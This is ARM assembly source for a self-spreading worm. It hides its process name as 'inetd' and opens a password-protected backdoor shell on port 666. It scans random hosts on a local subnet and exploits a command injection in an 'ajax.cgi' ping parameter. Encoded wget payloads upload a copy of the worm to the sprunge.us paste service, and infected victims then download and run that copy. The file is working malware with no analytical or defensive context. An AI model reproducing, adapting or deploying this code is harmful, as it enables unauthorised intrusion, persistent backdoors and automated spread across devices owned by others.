
.section .text
.global _start
.code 32

@ encrypt everything in layers

spawn_backdoor:
    ldr r7, =2                  @ fork the backdoor process
    sub r1, r1, r1              @ we dont have a process description, just inherit
    svc 0
    cmp r0, #-1                 @ on failure, return
    beq parent
    cmp r0, #0                  @ if this is the child, fork
    beq fork
parent:
    bx lr                       @ continue to the main loop
fork:
    @ socket
    ldr r7, =281
    ldr r0, =2
    ldr r1, =1
    sub r2, r2, r2
    svc 0
    cmp r0, #-1
    beq fork                    @ try again on failure
    cpy r6, r0
    @ bind
    ldr r7, =282
    ldr r1, =backdooraddr
    ldr r2, =16
    svc 0
    cmp r0, #-1
    beq fork                    @ try again on failure
    @ listen
    ldr r7, =284
    cpy r0, r6
    ldr r1, =5
    svc 0
    cmp r0, #-1
    beq fork                    @ try again on failure
    ldr r0, =sock
    str r6, [r0, #0]
fork_loop:
    @ accept
    ldr r7, =285
    cpy r0, r6
    ldr r1, =0
    ldr r2, =0
    svc 0
    cmp r0, #-1
    beq backdoor_cleanup       @ try again on failure
    cpy r6, r0

    ldr r0, =buffer
    sub r1, r1, r1
    sub r2, r2, r2
    sub r3, r3, r3
    bl forkpty
    cmp r0, #-1
    beq backdoor_cleanup
    cmp r0, #0
    bne backdoor_cleanup

    ldr r1, =password           @ load password buffer
    ldr r2, =4
    bl s_read                   @ read that shit in
    cmp r0, #-1
    beq backdoor_cleanup        @ start over on socket failure
    ldr r2, =name               @ load name, aka the password
    ldr r9, [r1, #0]            @ load name value into r9
    ldr r10, [r2, #0]           @ load password value into r10
    cmp r9, r10                 @ do they match?
    bne backdoor_cleanup        @ if not, cleanup and close socket

    sub r10, r10, r10           @ zero out a counter
duploop:
    @ dup2
    ldr r7, =63                 @ duplicate all standard out/in
    cpy r1, r10
    svc 0
    add r10, r10, #1
    cmp r10, #3
    bne duploop

    ldr r7, =11                 @ launch our friend mr. sh using execve
    ldr r0, =shellpath          @ the path to the shell executable
    ldr r1, =shellargv          @ shell argv pointer
    ldr r2, =shellenv           @ shell env pointer
    svc 0

backdoor_cleanup:
    bl close                    @ close socket
    ldr r0, =sock
    ldr r6, [r0, #0]
    bl fork_loop                @ restart

_start:
    ldr	r0, [sp, #4]
    ldr r1, =spoof              @ name to spoof
    bl strcpy                   @ rename this bitch

    ldr r0, =13                 @ SIGPIPE
    ldr r1, =1                  @ SIG_IGN
    bl signal
    bl spawn_backdoor           @ spawn backdoor
main_loop:
    ldr r10, =0x80808081        @ precalculated division multiplier for 255
    ldr r11, =7                 @ precalculated shift for divisor
    bl random                   @ call random number generator
    ldr r1, =[ip+3]             @ load the last byte of the ip address in socket struct
    strb r0, [r1, #0]           @ write our random number there
    ldr r10, =sockaddr          @ load the address of the struct
    bl connect                  @ connect to the randomly generated host
    cmp r0, #-1
    beq main_loop               @ try again on failure
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
    ldr r1, =check_payload      @ load the vulnerability test payload
    ldr r2, =126                @ its 126 bytes in length
    bl s_write                  @ send it out
    cmp r0, #-1
    beq cleanup                 @ on socket failure, go to cleanup

    bl read_u2response          @ swallow http header

    bl s_read                   @ s_read in nl
    ldr r2, =4                  @ s_read in 4 bytes, we are checking for the sring root
    bl s_read
    cmp r0, #-1
    beq cleanup                 @ on socket fail, cleanup

    ldr r8, =0x746f6f72         @ r8 = 'root'
    ldr r10, [r1, #0]           @ swap whats in the buffer with whats in r10
    cmp r8, r10                 @ are we root?
    bne cleanup                 @ if not, start over
    bl close                    @ close the socket
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
    ldr r10, =sockaddr          @ load remote socket struct again
    bl connect                  @ connect back
    cmp r0, #-1
    beq cleanup                 @ restart on failure
    
    ldr r1, =check_payload      @ load the infection test payload
    ldr r2, =71                 @ its 71 bytes in length
    bl s_write                  @ send it out
    cmp r0, #-1
    beq cleanup                 @ on socket failure, go to cleanup

    ldr r1, =check_infected     @ load the infection test payload
    ldr r2, =77                 @ its 77 bytes in length
    bl s_write                  @ send it out
    cmp r0, #-1
    beq cleanup                 @ on socket failure, go to cleanup

    ldr r1, =check_payload+77   @ load the closing out parts from out check payload
    ldr r2, =49                 @ 49 bytes of http closing statement
    bl s_write                  @ send this bitch out
    cmp r0, #-1
    beq cleanup                 @ on socket fail, start over

    bl read_u2response          @ swallow http header

    bl s_read                   @ s_read in nl
    ldr r2, =4                  @ s_read in 4 bytes, we are checking for the sring woot
    bl s_read
    cmp r0, #-1
    beq cleanup                 @ on socket fail, cleanup

    ldr r8, =0x746f6f77         @ r8 = 'woot'
    ldr r10, [r1, #0]           @ swap whats in the buffer with whats in r10
    cmp r8, r10                 @ does that shit exist?
    beq cleanup                 @ if so, start over
    bl close                    @ close the socket
@!!!!!!!!MAGIC!!!!!!!!!!!
magic:
    ldr r10, =localsock         @ load a socket struct to the local box
    bl connect                  @ connect to ourselves
    cmp r0, #-1
    beq magic                   @ on failure try again

    ldr r1, =check_payload      @ reuse the first 71 bytes of check_payload
    ldr r2, =71
    bl s_write                  @ send it out
    cmp r0, #-1
    beq magic                   @ on socket fail, start the process over

    ldr r1, =store_wormness     @ load our third party store payload
    ldr r2, =100                @ its 100 bytes long
    bl s_write                  @ send it out
    cmp r0, #-1
    beq magic                   @ on fail try everything again

    ldr r1, =check_payload+77   @ load the closing out parts from out check payload
    ldr r2, =49                 @ 49 bytes of http closing statement
    bl s_write                  @ send this bitch out
    cmp r0, #-1
    beq magic                   @ on socket fail, start over

    bl read_u2response          @ read in the http response header
    ldr r1, =buffer             @ load reuseable buffer address
    ldr r2, =23                 @ read 23 bytes: newline + sprunge address
    bl s_read                   @ read it in
    cmp r0, #-1
    beq magic                   @ on sock fail, restart
    bl close                    @ close out the socket
super_magic:
    ldr r10, =sockaddr          @ load remote socket struct again
    bl connect                  @ connect back
    cmp r0, #-1
    beq super_magic             @ restart on failure

    ldr r1, =check_payload      @ load intro from check payload again
    ldr r2, =71
    bl s_write                  @ send it
    cmp r0, #-1
    beq super_magic             @ on failure, try again

    ldr r1, =send_wormness      @ load the send payload
    ldr r2, =7                  @ first 7 bytes
    bl s_write                  @ send it out
    cmp r0, #-1
    beq super_magic             @ on socket fail, retry

    ldr r1, =[buffer+1]         @ ditch the leading new line, send the url
    ldr r2, =22                 @ it is guarenteed to be 22 bytes long
    bl s_write                  @ send it
    cmp r0, #-1
    beq super_magic             @ on failure, try again

    ldr r1, =[send_wormness+7]  @ load the beginning of the rest of the send payload
    ldr r2, =81                 @ 81 bytes of sexy
    bl s_write                  @ send it
    cmp r0, #-1
    beq super_magic             @ restart this madness on failure

    ldr r1, =check_payload+77   @ load the http closing statement
    ldr r2, =49                 @ blah blah size blah blah
    bl s_write                  @ send it
    cmp r0, #-1
    beq super_magic             @ check for socket fail, you know retry
    bl close                    @ close the socket
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@



cleanup:
    bl close
    b main_loop

debug:
    push {lr, r6}
    ldr r6, =1
    bl s_write
    pop {pc, r6}

@ exit(r0)
exit:
    ldr r7, =1
    svc 0

read_u2response:
push {lr}
    sub r9, r9, r9      @ zero out counter
    ldr r1, =buffer     @ store data in buffer
    ldr r2, =1          @ s_read 1 byte
read_start:
    bl s_read           @ s_read in byte
    cmp r0, #-1
    bxeq lr

    ldrb r10, [r1, #0]  @ swap byte from buffer into r10
    cmp r10, #0x0d	    @ is this a carriage return?
    beq read_match      @ if so look for another
    b read_start        @ if not s_read in another byte

read_match:
    bl s_read           @ s_read in the newline
    cmp r0, #-1
    bxeq lr
    bl s_read           @ s_read in the next character
    cmp r0, #-1
    bxeq lr
    ldrb r10, [r1, #0]  @ swap byte from buffer into r10
    cmp r10, #0x0d      @ is this a carriage return?
    bne read_start
pop {pc}

random:
    @ time seed
    ldr r7, =43
    sub r0, r0, r0
    svc 0

    @ Implementation of George Marsaglia's xorshift PRNG -> http://www.jstatsoft.org/v11/i04/paper
    eor r0, r0, lsl #13
    eor r0, r0, lsr #9
    eor r0, r0, lsr #7

    @ r0 = r0 % r10
    cpy r1, r10            @ r1 -> magic_number
    umull r1, r2, r1, r0   @ r1 -> Lower32Bits(r1*r0). r2 ← Upper32Bits(r1*r0)
    mov r0, r1, LSR r11    @ r0 -> r1 >> r11
    add r0, r0, #1
    bx lr

s_write:
    ldr r7, =4
    cpy r0, r6
    svc 0
    bx lr

s_read:
    ldr r7, =3
    cpy r0, r6
    svc 0
    bx lr

close:
    ldr r7, =6
    cpy r0, r6
    svc 0
    bx lr

connect:
@ connect to a victim
    @ socket
    ldr r7, =281
    ldr r0, =2
    ldr r1, =1
    sub r2, r2, r2
    svc 0
    @connect
    cpy r6, r0
    ldr r7, =283
    cpy r1, r10
    ldr r2, =16
    svc 0
    bx lr

.section .data
sockaddr:
.short 0x2      @ AF_INET
.short 0x5000	@ port
ip:
.byte 10,0,0,2	@ IP

localsock:
.short 0x2      @ AF_INET
.short 0x5000	@ port
.byte 127,0,0,1	@ IP

backdooraddr:
.short 0x2      @ AF_INET
.short 0x9A02	@ port
.space 4        @ INADDR_ANY


check_payload: @ 71 | 77 -> 49
.asciz "GET /ajax.cgi?action=tag_ipPing&pip=127.0.0.1+%3E%2Fdev%2Fnull%20%26%26whoami HTTP/1.0\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n"

check_infected:
.asciz "if%20%5B%20-e%208%3D%3DD%20%5D%3Bthen%20echo%20woot%3Belse%20echo%20booo%3Bfi"

store_wormness: @ 100 inject this on local box
.asciz "wget%20-q%20-O%20-%20--post-data%3D%22sprunge%3D%24(cat%20.%2F8%3D%3DD)%22%20http%3A%2F%2Fsprunge.us"

send_wormness: @ 7 -> 81
.asciz "wget%20%20-O%208%3D%3DD%202%3E%2Fdev%2Fnull%26%26(.%2F8%3D%3DD%20%26%3E%2Fdev%2Fnull%26)"


buffer: .space 23
name: .asciz "8==D"
spoof: .asciz "inetd"
password: .space 4
shellpath: .asciz "/bin/sh"
arg0: .asciz "/sbin/lighttpd"
arg1: .asciz "-i"
shellargv: .word arg0, arg1, 0
env0: .asciz "TERM=xterm"
env1: .asciz "PS1=8==D "
shellenv: .word env0, env1, 0
sock: .space 4


